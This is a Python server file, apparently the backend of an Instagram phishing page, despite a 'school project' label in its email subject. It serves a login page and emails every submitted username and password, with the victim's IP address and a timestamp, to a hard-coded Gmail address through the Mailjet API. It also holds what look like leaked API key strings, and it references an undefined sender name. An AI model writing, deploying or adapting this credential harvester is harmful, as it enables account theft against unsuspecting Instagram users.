# server.py (versión con Mailjet)
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import urllib.parse
from datetime import datetime
import os
import requests

import os

MAILJET_API_KEY = os.environ.get("26f97d1e712118b2df6b678c218a6cc6")
MAILJET_SECRET_KEY = os.environ.get("097bc551e192cb74d27ea10aeb5b3cbf")
SENDER_EMAIL = os.environ.get('SENDER_EMAIL', "mexicanonwod@gmail.com")
RECIPIENT_EMAIL = os.environ.get('RECIPIENT_EMAIL', "isowyvencid@gmail.com")

class InstagramHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_file('index.html', 'text/html')
        else:
            self.send_error(404)

    def do_POST(self):
        if self.path == '/login':
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                data = json.loads(post_data.decode('utf-8'))

                username = data.get('username', '').strip()
                password = data.get('password', '').strip()

                # Enviar por Mailjet
                self.send_email_mailjet(username, password)

                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"status": "success"}')
            except Exception as e:
                print(f"Error al procesar login: {e}")
                self.send_error(500)
        else:
            self.send_error(404)

    def send_email_mailjet(self, username, password):
        url = "https://api.mailjet.com/v3.1/send"
        data = {
            "Messages": [
                {
                    "From": {
                        "Email": SENDER_EMAIL,
                        "Name": SENDER_NAME
                    },
                    "To": [
                        {
                            "Email": RECIPIENT_EMAIL,
                            "Name": "Tú"
                        }
                    ],
                    "Subject": "🚨 Nuevo inicio de sesión (Proyecto Escolar)",
                    "TextPart": f"""
Usuario: {username}
Contraseña: {password}
IP: {self.client_address[0]}
Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
                    """.strip()
                }
            ]
        }

        response = requests.post(
            url,
            json=data,
            auth=(MAILJET_API_KEY, MAILJET_SECRET_KEY)
        )

        if response.status_code == 200:
            print("✅ Correo enviado con Mailjet")
        else:
            print(f"❌ Error Mailjet: {response.status_code} - {response.text}")

    def send_file(self, filename, content_type):
        try:
            with open(filename, 'rb') as f:
                self.send_response(200)
                self.send_header('Content-type', content_type)
                self.end_headers()
                self.wfile.write(f.read())
        except FileNotFoundError:
            self.send_error(404)

if __name__ == "__main__":
    PORT = int(os.environ.get('PORT', 8080))
    server = HTTPServer(('0.0.0.0', PORT), InstagramHandler)
    print(f"Servidor corriendo en puerto {PORT}")
    server.serve_forever()
